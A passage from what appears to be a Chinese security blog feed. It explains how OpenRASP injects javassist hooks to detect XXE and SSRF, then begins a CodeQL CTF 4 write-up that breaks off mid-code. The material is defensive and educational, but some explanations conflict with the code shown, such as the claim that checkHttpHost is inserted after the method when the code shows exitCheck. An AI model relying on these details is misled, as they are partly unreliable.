class="hljs-string">&quot;$1&quot;</span>, String.class);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">src1</span> <span class="hljs-operator">=</span> getInvokeStaticSrc(XXEHook.class, <span class="hljs-string">&quot;checkXXE&quot;</span>, <span class="hljs-string">&quot;$5&quot;</span>, String.class);<br>    insertBefore(ctClass, <span class="hljs-string">&quot;expandSystemId&quot;</span>, <span class="hljs-string">&quot;(Ljava/lang/String;Ljava/lang/String;Z)Ljava/lang/String;&quot;</span>, src);<br>    insertBefore(ctClass, <span class="hljs-string">&quot;setDescription&quot;</span>, <span class="hljs-string">&quot;(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;&quot;</span> +<br>            <span class="hljs-string">&quot;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V&quot;</span>, src1);<br>&#125;<br></code></pre></td></tr></table></figure><p>变量名ctClass当然就是我们要被修改的方法了</p><p>而<code>getInvokeStaticSrc</code> 则用来获取调用静态方法的代码字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 获取调用静态方法的代码字符串</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> invokeClass 静态方法所属的类</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> methodName  静态方法名称</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> paramString 调用传入的参数字符串,按照javassist格式</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> 整合之后的代码</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getInvokeStaticSrc</span><span class="hljs-params">(Class invokeClass, String methodName, String paramString, Class... parameterTypes)</span> &#123;<br></code></pre></td></tr></table></figure><p>我们拿src举例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">src</span> <span class="hljs-operator">=</span> getInvokeStaticSrc(XXEHook.class, <span class="hljs-string">&quot;checkXXE&quot;</span>, <span class="hljs-string">&quot;$1&quot;</span>, String.class);<br></code></pre></td></tr></table></figure><p>这里我们使用了<code>getInvokeStaticSrc</code> 方法的作用是生成一段代码，他会在运行时动态调用 <code>XXEHook</code> 类中的 <code>checkXXE</code> 静态方法。</p><p>而当我们接着调用这个代码时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">insertBefore(ctClass, <span class="hljs-string">&quot;expandSystemId&quot;</span>, <span class="hljs-string">&quot;(Ljava/lang/String;Ljava/lang/String;Z)Ljava/lang/String;&quot;</span>, src);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 在目标类的目标方法的入口插入相应的源代码</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> ctClass    目标类</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> methodName 目标方法名称</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> desc       目标方法的描述符号</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> src        待插入的源代码</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertBefore</span><span class="hljs-params">(CtClass ctClass, String methodName, String desc, String src)</span><br></code></pre></td></tr></table></figure><p>这里src中的$1就会被替换为<code>expandSystemId</code>这个方法的第一个参数，也就是把<code>expandSystemId</code>这个方法的第一个参数作为参数传递给checkXXE，也就是说会在目标代码前面插入一段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">com.baidu.openrasp.hook.system.ProcessBuilderHook.checkXXE($<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>下面的src1代码也就是类似了</p><h3 id="HttpClientHook"><a href="#HttpClientHook" class="headerlink" title="HttpClientHook"></a>HttpClientHook</h3><p>HttpClient中发起请求前，都会先创建类似于下图代码的类的实例，然后才能发起请求，该实例中包含着URI信息，而对于SSRF的攻击检测，就是在请求发起前，对URI进行检测，检测是否是SSRF，因此需要hook到这些类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isClassMatched</span><span class="hljs-params">(String className)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;org/apache/http/impl/client/CloseableHttpClient&quot;</span>.equals(className)<br>            || <span class="hljs-string">&quot;org/apache/http/impl/client/AutoRetryHttpClient&quot;</span>.equals(className)<br>            || <span class="hljs-string">&quot;org/apache/http/impl/client/DecompressingHttpClient&quot;</span>.equals(className)<br>            <span class="hljs-comment">// 兼容 4.0 版本, 4.0 版本没有 CloseableHttpClient</span><br>            || <span class="hljs-string">&quot;org/apache/http/impl/client/AbstractHttpClient&quot;</span>.equals(className);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们重点分析的是他的hookMethod</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hookMethod</span><span class="hljs-params">(CtClass ctClass)</span> <span class="hljs-keyword">throws</span> IOException, CannotCompileException, NotFoundException &#123;<br>    CtClass[] interfaces = ctClass.getInterfaces();<br>    <span class="hljs-keyword">if</span> (interfaces != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">for</span> (CtClass inter : interfaces) &#123;<br>            <span class="hljs-comment">// 兼容 http client 4.0 版本的 AbstractHttpClient</span><br>            <span class="hljs-keyword">if</span> (inter.getName().equals(<span class="hljs-string">&quot;org.apache.http.client.HttpClient&quot;</span>)) &#123;<br>                LinkedList&lt;CtBehavior&gt; methods =<br>                        getMethod(ctClass, <span class="hljs-string">&quot;execute&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>                <span class="hljs-comment">//获取org.apache.http.client.HttpClient类中所有名为execute的方法，会用于http请求</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">afterSrc</span> <span class="hljs-operator">=</span> getInvokeStaticSrc(HttpClientHook.class, <span class="hljs-string">&quot;exitCheck&quot;</span>,<br>                        <span class="hljs-string">&quot;$1,$_&quot;</span>, Object.class, Object.class);<br>                <span class="hljs-comment">//$1代表方法的第一个参数，而$_代表方法的返回值</span><br>                <span class="hljs-keyword">for</span> (CtBehavior method : methods) &#123;<br>                    <span class="hljs-keyword">if</span> (method.getSignature().startsWith(<span class="hljs-string">&quot;(Lorg/apache/http/client/methods/HttpUriRequest&quot;</span>)) &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">src</span> <span class="hljs-operator">=</span> getInvokeStaticSrc(HttpClientHook.class,<br>                                <span class="hljs-string">&quot;checkHttpUri&quot;</span>, <span class="hljs-string">&quot;$1&quot;</span>, Object.class);<br>                        insertBefore(method, src);<br>                        insertAfter(method, afterSrc, <span class="hljs-literal">true</span>);<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (method.getSignature().startsWith(<span class="hljs-string">&quot;(Lorg/apache/http/HttpHost&quot;</span>)) &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">src</span> <span class="hljs-operator">=</span> getInvokeStaticSrc(HttpClientHook.class,<br>                                <span class="hljs-string">&quot;checkHttpHost&quot;</span>, <span class="hljs-string">&quot;$1&quot;</span>, Object.class);<br>                        insertBefore(method, src);<br>                        insertAfter(method, afterSrc, <span class="hljs-literal">true</span>);<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先获取了所有<code>org.apache.http.client.HttpClient</code>的接口,然后在方法前面插入<code>checkHttpUri</code>方法，在方法后面插入<code>checkHttpHost</code>，我们接着详细的去看这一行代码的调用过程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">afterSrc</span> <span class="hljs-operator">=</span> getInvokeStaticSrc(HttpClientHook.class, <span class="hljs-string">&quot;exitCheck&quot;</span>,<span class="hljs-string">&quot;$1,$_&quot;</span>, Object.class, Object.class);<br></code></pre></td></tr></table></figure><p>既然传入的参数是httpclient的第一个参数和最后一个参数，我们就去具体的代码中看看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java">HttpResponse <span class="hljs-title function_">execute</span><span class="hljs-params">(HttpUriRequest request)</span><br>    <span class="hljs-keyword">throws</span> IOException, ClientProtocolException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Executes HTTP request using the given context.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request   the request to execute</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> context   the context to use for the execution, or</span><br><span class="hljs-comment"> *                  &#123;<span class="hljs-doctag">@code</span> null&#125; to use the default context</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span>  the response to the request. This is always a final response,</span><br><span class="hljs-comment"> *          never an intermediate response with an 1xx status code.</span><br><span class="hljs-comment"> *          Whether redirects or authentication challenges will be returned</span><br><span class="hljs-comment"> *          or handled automatically depends on the implementation and</span><br><span class="hljs-comment"> *          configuration of this client.</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException in case of a problem or the connection was aborted</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> ClientProtocolException in case of an http protocol error</span><br><span class="hljs-comment"> */</span><br>HttpResponse <span class="hljs-title function_">execute</span><span class="hljs-params">(HttpUriRequest request, HttpContext context)</span><br>    <span class="hljs-keyword">throws</span> IOException, ClientProtocolException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Executes HTTP request using the default context.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> target    the target host for the request.</span><br><span class="hljs-comment"> *                  Implementations may accept &#123;<span class="hljs-doctag">@code</span> null&#125;</span><br><span class="hljs-comment"> *                  if they can still determine a route, for example</span><br><span class="hljs-comment"> *                  to a default target or by inspecting the request.</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request   the request to execute</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span>  the response to the request. This is always a final response,</span><br><span class="hljs-comment"> *          never an intermediate response with an 1xx status code.</span><br><span class="hljs-comment"> *          Whether redirects or authentication challenges will be returned</span><br><span class="hljs-comment"> *          or handled automatically depends on the implementation and</span><br><span class="hljs-comment"> *          configuration of this client.</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException in case of a problem or the connection was aborted</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> ClientProtocolException in case of an http protocol error</span><br><span class="hljs-comment"> */</span><br>HttpResponse <span class="hljs-title function_">execute</span><span class="hljs-params">(HttpHost target, HttpRequest request)</span><br>    <span class="hljs-keyword">throws</span> IOException, ClientProtocolException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Executes HTTP request using the given context.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> target    the target host for the request.</span><br><span class="hljs-comment"> *                  Implementations may accept &#123;<span class="hljs-doctag">@code</span> null&#125;</span><br><span class="hljs-comment"> *                  if they can still determine a route, for example</span><br><span class="hljs-comment"> *                  to a default target or by inspecting the request.</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request   the request to execute</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> context   the context to use for the execution, or</span><br><span class="hljs-comment"> *                  &#123;<span class="hljs-doctag">@code</span> null&#125; to use the default context</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span>  the response to the request. This is always a final response,</span><br><span class="hljs-comment"> *          never an intermediate response with an 1xx status code.</span><br><span class="hljs-comment"> *          Whether redirects or authentication challenges will be returned</span><br><span class="hljs-comment"> *          or handled automatically depends on the implementation and</span><br><span class="hljs-comment"> *          configuration of this client.</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException in case of a problem or the connection was aborted</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> ClientProtocolException in case of an http protocol error</span><br><span class="hljs-comment"> */</span><br>HttpResponse <span class="hljs-title function_">execute</span><span class="hljs-params">(HttpHost target, HttpRequest request,</span><br><span class="hljs-params">                     HttpContext context)</span><br>    <span class="hljs-keyword">throws</span> IOException, ClientProtocolException;<br></code></pre></td></tr></table></figure><p>我们能够看到httpClientHook对不同的方法使用了不同的方法来进行检测</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (method.getSignature().startsWith(<span class="hljs-string">&quot;(Lorg/apache/http/client/methods/HttpUriRequest&quot;</span>)) &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">src</span> <span class="hljs-operator">=</span> getInvokeStaticSrc(HttpClientHook.class,<br>            <span class="hljs-string">&quot;checkHttpUri&quot;</span>, <span class="hljs-string">&quot;$1&quot;</span>, Object.class);<br>    insertBefore(method, src);<br>    insertAfter(method, afterSrc, <span class="hljs-literal">true</span>);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (method.getSignature().startsWith(<span class="hljs-string">&quot;(Lorg/apache/http/HttpHost&quot;</span>)) &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">src</span> <span class="hljs-operator">=</span> getInvokeStaticSrc(HttpClientHook.class,<br>            <span class="hljs-string">&quot;checkHttpHost&quot;</span>, <span class="hljs-string">&quot;$1&quot;</span>, Object.class);<br>    insertBefore(method, src);<br>    insertAfter(method, afterSrc, <span class="hljs-literal">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>对于<code>HttpUriRequest</code>方法，将会使用checkhttpuri来检测</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">HttpUriRequest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpRequest</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Returns the HTTP method this request uses, such as &#123;<span class="hljs-doctag">@code</span> GET&#125;,</span><br><span class="hljs-comment">     * &#123;<span class="hljs-doctag">@code</span> PUT&#125;, &#123;<span class="hljs-doctag">@code</span> POST&#125;, or other.</span><br><span class="hljs-comment">     */</span><br>    String <span class="hljs-title function_">getMethod</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Returns the URI this request uses, such as</span><br><span class="hljs-comment">     * &#123;<span class="hljs-doctag">@code</span> http://example.org/path/to/file&#125;.</span><br><span class="hljs-comment">     * &lt;p&gt;</span><br><span class="hljs-comment">     * Note that the URI may be absolute URI (as above) or may be a relative URI.</span><br><span class="hljs-comment">     * &lt;/p&gt;</span><br><span class="hljs-comment">     * &lt;p&gt;</span><br><span class="hljs-comment">     * Implementations are encouraged to return</span><br><span class="hljs-comment">     * the URI that was initially requested.</span><br><span class="hljs-comment">     * &lt;/p&gt;</span><br><span class="hljs-comment">     * &lt;p&gt;</span><br><span class="hljs-comment">     * To find the final URI after any redirects have been processed,</span><br><span class="hljs-comment">     * please see the section entitled</span><br><span class="hljs-comment">     * &lt;a href=&quot;http://hc.apache.org/httpcomponents-client-ga/tutorial/html/fundamentals.html#d4e205&quot;&gt;HTTP execution context&lt;/a&gt;</span><br><span class="hljs-comment">     * in the</span><br><span class="hljs-comment">     * &lt;a href=&quot;http://hc.apache.org/httpcomponents-client-ga/tutorial/html&quot;&gt;HttpClient Tutorial&lt;/a&gt;</span><br><span class="hljs-comment">     * &lt;/p&gt;</span><br><span class="hljs-comment">     */</span><br>    URI <span class="hljs-title function_">getURI</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">abort</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> UnsupportedOperationException;<br><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAborted</span><span class="hljs-params">()</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>我们随便找一个他的实现类来看一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpDelete</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpRequestBase</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">METHOD_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;DELETE&quot;</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HttpDelete</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HttpDelete</span><span class="hljs-params">(<span class="hljs-keyword">final</span> URI uri)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        setURI(uri);<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException if the uri is invalid.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HttpDelete</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String uri)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        setURI(URI.create(uri));<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getMethod</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> METHOD_NAME;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>原本的checkHttpUri方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkHttpUri</span><span class="hljs-params">(Object uriValue)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!isChecking.get() &amp;&amp; uriValue != <span class="hljs-literal">null</span>) &#123;<br>        isChecking.set(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">URI</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> (URI) Reflection.invokeMethod(uriValue, <span class="hljs-string">&quot;getURI&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;);<br>        checkHttpUrl(getSsrfParamFromURI(uri));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>变量src中插入的方法，此时uriValue变量就会变成httpDelete的构造方法的参数，也就是uri</p><p>最终会在这段代码前面插入这样一段代码</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">src</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.example.HttpClientHook.checkHttpHost($1)&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>com.example是HttpClientHook类的包名</p><p>在rasp的简单尝试中我们写到了命令执行的获取与拦截方法，现在来看看rasp官方的拦截方法与我们自己的有什么异同</p><p>(未完待续)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Github CodeQL training 思路</title>
    <link href="/decemberus.com/2023/11/16/Github%20ctf4%20training/"/>
    <url>/decemberus.com/2023/11/16/Github%20ctf4%20training/</url>
    
    <content type="html"><![CDATA[<h1 id="Github-ctf4-training"><a href="#Github-ctf4-training" class="headerlink" title="Github ctf4 training"></a>Github ctf4 training</h1><p><a href="https://securitylab.github.com/ctf/codeql-and-chill/">GitHub Security Lab CTF 4: CodeQL and Chill - The Java Edition | GitHub Security Lab</a></p><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>一些梳理</p><p>如果说ma是调用方法的一整个的话，如下图所示，他是把整个调用方法的句子都给返回了</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231225222957383.png" alt="image-20231225222957383"> </p><p>如果使用<code>getQualifier</code>，那么</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231225223107399.png" alt="image-20231225223107399"> </p><p>则会返回调用方法的类</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">import</span> DataFlow::PathGraph<br></code></pre></td></tr></table></figure><p>这句话可以在结果中分析数据流图</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@name</span> finis the ql</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@kind</span> path-problem</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@derscription</span> </span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p>在查询语句前面加上这个注释可以看alert</p><h2 id="Step-1-1-Sources"><a href="#Step-1-1-Sources" class="headerlink" title="Step 1.1: Sources"></a>Step 1.1: Sources</h2><p>因为这个触发的函数是<code>ConstraintValidator</code>，所以我们寻找的source就是他，那么创建一个函数类型来寻找所说的<code>ConstraintValidator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConstraintValidatorClass</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Class</span> &#123;<br>     ConstraintValidatorClass()&#123;<br>        <span class="hljs-built_in">this</span>.getASupertype().getASupertype+().hasQualifiedName(<span class="hljs-string">&quot;javax.validation&quot;</span>, <span class="hljs-string">&quot;ConstraintValidator&lt;&gt;&quot;</span>)<br>     &#125;<br>&#125;<br><br>from ConstraintValidatorClass con<br>select con<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231224200842210.png" alt="image-20231224200842210"> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConstraintValidatorIsValid</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Method</span>&#123;<br>    ConstraintValidatorIsValid()&#123;<br>        <span class="hljs-built_in">this</span>.getDeclaringType() <span class="hljs-keyword">instanceof</span> ConstraintValidatorClass<br>        and <span class="hljs-built_in">this</span>.hasName(<span class="hljs-string">&quot;isValid&quot;</span>)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现有私有方法，所以要过滤</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231224202224324.png" alt="image-20231224202224324"> </p><p>最终摸样是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConstraintValidatorIsValid</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Method</span>&#123;<br>    ConstraintValidatorIsValid()&#123;<br>        <span class="hljs-built_in">this</span>.getDeclaringType() <span class="hljs-keyword">instanceof</span> ConstraintValidatorClass<br>        and <span class="hljs-built_in">this</span>.hasName(<span class="hljs-string">&quot;isValid&quot;</span>)<br>        and <span class="hljs-title function_">not</span><span class="hljs-params">(<span class="hljs-built_in">this</span>.isPrivate()</span>)<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Step-1-2-Sink"><a href="#Step-1-2-Sink" class="headerlink" title="Step 1.2: Sink"></a>Step 1.2: Sink</h2><p>在写sink的时候有一个坑，起初我是和isSource同一个写法的，即</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 